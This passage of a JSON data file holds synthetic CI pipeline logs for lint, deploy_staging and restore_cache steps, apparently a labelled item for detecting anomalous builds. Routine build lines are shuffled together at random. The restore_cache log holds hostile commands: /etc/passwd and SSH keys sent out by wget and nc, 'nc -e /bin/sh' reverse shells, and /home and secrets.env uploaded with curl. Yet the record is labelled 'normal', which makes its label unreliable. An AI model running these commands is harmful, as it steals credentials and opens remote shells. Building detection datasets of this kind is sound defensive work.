          "[12:00:30] INFO: Processing request",
          "Cache hit for key-4838",
          "[12:00:30] WARN: Deprecated API usage",
          "Installing eslint@4.14.0",
          "  PASS: test_auth_login (15ms)",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-9631",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing jest@2.9.0",
          "  PASS: test_db_connect (444ms)",
          "\u2713 build completed",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing axios@1.16.0",
          "  PASS: test_cache_hit (179ms)",
          "Step 7/10: Building",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 test completed",
          "Step 4/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:30] INFO: Processing request",
          "Installing jest@3.12.0",
          "Compiling src/service.java...",
          "  PASS: test_user_create (18ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 6/10: Building",
          "Installing jest@3.7.0",
          "  PASS: test_api_health (114ms)",
          "  PASS: test_api_health (86ms)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-9498",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-5230",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_api_health (19ms)",
          "Installing axios@4.20.0",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_auth_login (381ms)",
          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (154ms)",
          "\u2713 build completed",
          "Cache hit for key-8330",
          "Cache hit for key-3929",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/service.java...",
          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "  PASS: test_api_health (287ms)",
          "Compiling src/service.java...",
          "Installing eslint@3.20.0",
          "[12:00:30] INFO: Processing request",
          "Step 7/10: Building",
          "Installing axios@1.11.0",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-10T12:04:45.366176",
        "finished_at": "2025-12-10T12:05:01.312883",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Installing prettier@4.18.0",
          "  PASS: test_cache_hit (393ms)",
          "Cache hit for key-1888",
          "Step 7/10: Building",
          "Cache hit for key-3612",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Exception: RuntimeError",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-3433",
          "Installing eslint@4.17.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 build completed",
          "Installing webpack@5.16.0",
          "  PASS: test_db_connect (463ms)",
          "  PASS: test_auth_login (328ms)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_auth_login (369ms)",
          "Cache hit for key-9172",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing eslint@5.2.0",
          "Cache hit for key-9131",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] ERROR: Connection failed",
          "  PASS: test_user_create (295ms)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing lodash@4.20.0",
          "[12:00:30] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Exception: TypeError",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_cache_hit (380ms)",
          "  PASS: test_auth_login (268ms)",
          "\u2713 test completed",
          "Cache hit for key-9781",
          "Step 5/10: Building",
          "  PASS: test_auth_login (185ms)",
          "Compiling src/handler.rs...",
          "WARNING: jest has known vulnerabilities",
          "Installing jest@4.14.0",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (477ms)",
          "\u2717 build failed with exit code 76",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing express@4.9.0",
          "Installing express@1.6.0",
          "  PASS: test_api_health (361ms)",
          "Installing jest@1.2.0",
          "  PASS: test_api_health (30ms)",
          "Compiling src/index.js...",
          "Installing eslint@2.1.0",
          "[12:00:30] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_db_connect (156ms)",
          "Installing eslint@3.20.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_cache_hit (54ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-6119",
          "Cache hit for key-9400",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing express@3.20.0",
          "Cache hit for key-6214",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_auth_login (36ms)",
          "Cache hit for key-7132",
          "  PASS: test_user_create (149ms)",
          "Compiling src/index.js...",
          "  PASS: test_user_create (305ms)",
          "[12:00:30] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_user_create (377ms)",
          "Step 1/10: Building",
          "\u2717 build failed with exit code 72",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Installing webpack@2.12.0",
          "Cache hit for key-1355",
          "[12:00:30] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-2890",
          "Installing eslint@3.16.0",
          "Installing prettier@5.3.0",
          "Installing prettier@5.3.0",
          "Compiling src/service.java...",
          "  PASS: test_user_create (97ms)",
          "Installing lodash@5.0.0",
          "\u2713 lint completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing express@4.10.0",
          "Installing prettier@1.20.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_auth_login (39ms)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-10T12:05:01.312883",
        "finished_at": "2025-12-10T12:05:10.880907",
        "log_lines": [
          "=== Step: restore_cache ===",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (407ms)",
          "  PASS: test_db_connect (402ms)",
          "Installing express@1.1.0",
          "\u2717 build failed with exit code 120",
          "  PASS: test_auth_login (358ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Installing express@2.8.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 82.174.160.145 1078",
          "  PASS: test_cache_hit (368ms)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_auth_login (448ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/index.js...",
          "[12:00:30] WARN: Deprecated API usage",
          "Cache hit for key-2457",
          "Cache hit for key-5946",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-4060",
          "Step 4/10: Building",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "nc -e /bin/sh 191.28.104.91 55833",
          "Step 7/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "  PASS: test_api_health (491ms)",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "Step 4/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 4/10: Building",
          "Cache hit for key-2003",
          "  PASS: test_db_connect (76ms)",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Step 6/10: Building",
          "[12:00:30] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:30] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:30] INFO: Processing request",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Installing react@1.5.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "[12:00:30] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "Installing webpack@3.16.0",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Installing jest@1.7.0",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "Installing axios@5.14.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 test completed",
          "  PASS: test_db_connect (42ms)",
          "Installing prettier@3.8.0",
          "Step 2/10: Building",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing prettier@4.0.0",
          "\u2713 lint completed",
          "Cache hit for key-9615",
          "Cache hit for key-5400",
          "Compiling src/utils.go...",
          "Sending 498MB of data to startup.dev",
          "Artifact uploaded: build.tar.gz (1MB)",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-6083",
          "[12:00:30] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_db_connect (292ms)",
          "Installing axios@5.20.0",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (402ms)",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Compiling src/app.ts...",
          "Installing eslint@5.20.0",
          "Installing express@3.13.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "  PASS: test_api_health (87ms)",
          "Compiling src/service.java...",
          "Cache hit for key-9055",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "nc -e /bin/sh 236.168.17.56 17602",
          "[12:00:30] ERROR: Connection failed",
          "\u2713 build completed",
          "Cache hit for key-7696",
          "Compiling src/main.py...",
          "  PASS: test_user_create (238ms)",
          "[12:00:30] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "  PASS: test_cache_hit (61ms)",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Installing prettier@2.12.0",
          "\u2713 test completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 142.238.250.45 42621",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/app.ts...",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Cache hit for key-2634",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "Cache hit for key-2847",
          "Cache hit for key-6402",
          "[12:00:30] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 1.75.60.62 16707",
          "Installing lodash@3.15.0",
          "Cache hit for key-7477",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:30] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Installing react@1.10.0",
          "  PASS: test_auth_login (314ms)",
          "\u2713 test completed",
          "Cache hit for key-1677",
          "  PASS: test_auth_login (279ms)",
          "=== Step restore_cache completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}